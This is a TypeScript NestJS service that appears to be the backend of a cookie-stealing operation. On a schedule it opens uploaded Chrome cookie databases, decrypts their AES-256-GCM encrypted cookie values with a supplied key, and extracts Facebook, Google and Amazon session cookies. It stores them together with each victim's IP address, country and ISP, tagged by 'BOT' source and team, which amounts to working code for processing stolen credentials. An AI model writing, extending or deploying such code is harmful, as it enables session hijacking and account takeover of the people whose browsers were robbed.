import { Injectable, Logger } from '@nestjs/common';
import { InjectRepository } from "@nestjs/typeorm";
import { CookieRaw } from "../public/cookie-raw.entity";
import { Repository } from "typeorm";
import { join } from "path";
import { CookieEntity, CookieSource } from "../cookies/entities/cookie.entity";
import { isValidCookie } from "../base/const/Utils";
import { Cron, CronExpression } from "@nestjs/schedule";

const sqlite3 = require('sqlite3').verbose();
const { open } = require('sqlite');
const crypto = require('crypto');
const cluster = require('cluster');

@Injectable()
export class ProcessRawCookieService {
    private readonly logger = new Logger(ProcessRawCookieService.name);

    constructor(
        @InjectRepository(CookieRaw)
        private cookieRawRepository: Repository<CookieRaw>,
        @InjectRepository(CookieEntity)
        private cookieEntityRepository: Repository<CookieEntity>,
    ) {
    }

    @Cron(CronExpression.EVERY_5_MINUTES)
    public async processCookie() {
        if (!cluster.isMaster && cluster.worker && cluster.worker.id != 1) {
            return;
        }

        const getProcessCookie: CookieRaw[] = await this.cookieRawRepository.find({
            where: {
                isProcessing: false
            }
        });

        for (const cookieRaw of getProcessCookie) {
            try {
                const decryptKey = Buffer.from(JSON.parse(cookieRaw.decryptKey))
                const dbConnection = await this.createDbConnection(join(__dirname, '../../', cookieRaw.filePath));

                const domainList = [ 'facebook.com', 'google.com', 'amazon.com' ];

                for (const domainKey of domainList) {
                    let cookieList: any[] = await dbConnection.all(`SELECT * FROM cookies WHERE host_key LIKE '%${domainKey}%'`);

                    if (cookieList.length === 0) {
                        continue
                    }

                    if (domainKey === 'google.com') {
                        cookieList = cookieList.filter(x => x.host_key === '.google.com')
                    }

                    for (const processCookie of cookieList) {
                        let encryptedValue = processCookie.encrypted_value;
                        if (encryptedValue[0] == 0x76 && encryptedValue[1] == 0x31 && encryptedValue[2] == 0x30) {
                            const nonce = encryptedValue.slice(3, 15);
                            const tag = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
                            encryptedValue = encryptedValue.slice(15, encryptedValue.length - 16);

                            processCookie.value = this.decryptAES256GCM(decryptKey, encryptedValue, nonce, tag).toString('utf-8');

                            delete processCookie.encrypted_value;
                        }
                    }

                    const cookieString = cookieList.filter(x => x.value).map(x => x.name + '=' + x.value).join(';');
                    if (cookieString.length === 0) {
                        continue;
                    }

                    let hasError = false;
                    if (!isValidCookie(cookieString) && domainKey === 'facebook.com') {
                        hasError = true;
                        cookieRaw.error = 'Cookie Facebook không hợp lệ';
                    }

                    if (hasError) {
                        continue;
                    }

                    /*let cookieEntity = await this.checkExistCookie(cookieString);
                    if (!cookieEntity) {
                        cookieEntity = new CookieEntity();
                    }*/

                    const cookieEntity = new CookieEntity();
                    cookieEntity.cookie = cookieString;
                    cookieEntity.ipAddress = cookieRaw.ipAddress;
                    cookieEntity.countryName = cookieRaw.countryName;
                    cookieEntity.countryCode = cookieRaw.countryCode;
                    cookieEntity.isp = cookieRaw.isp;
                    cookieEntity.source = CookieSource.BOT;
                    cookieEntity.team = cookieRaw.classify;
                    cookieEntity.domain = domainKey;
                    cookieEntity.createdBy = cookieEntity.createdBy = 1;

                    await this.cookieEntityRepository.save(cookieEntity);
                }

                // Đổi trạng thái thành đã sử dụng
                cookieRaw.isProcessing = true;
                cookieRaw.updateAt = new Date();
                await this.cookieRawRepository.save(cookieRaw);
            } catch (ex) {
                // Đổi trạng thái thành đã sử dụng
                cookieRaw.error = ex.toString();
                cookieRaw.isProcessing = true;
                cookieRaw.updateAt = new Date();
                await this.cookieRawRepository.save(cookieRaw);

                this.logger.error(ex);
            }
        }

        return {
            success: true,
            processCount: getProcessCookie.length
        };
    }

    public createDbConnection(filename: string) {
        return open({
            filename,
            driver: sqlite3.Database
        });
    }

    public decryptAES256GCM(key, enc, nonce, tag) {
        const algorithm = 'aes-256-gcm';
        const decipher = crypto.createDecipheriv(algorithm, key, nonce);
        decipher.setAuthTag(tag);

        let str = decipher.update(enc, 'base64', 'utf8');
        str += decipher.final('utf-8');
        return str;
    }
}
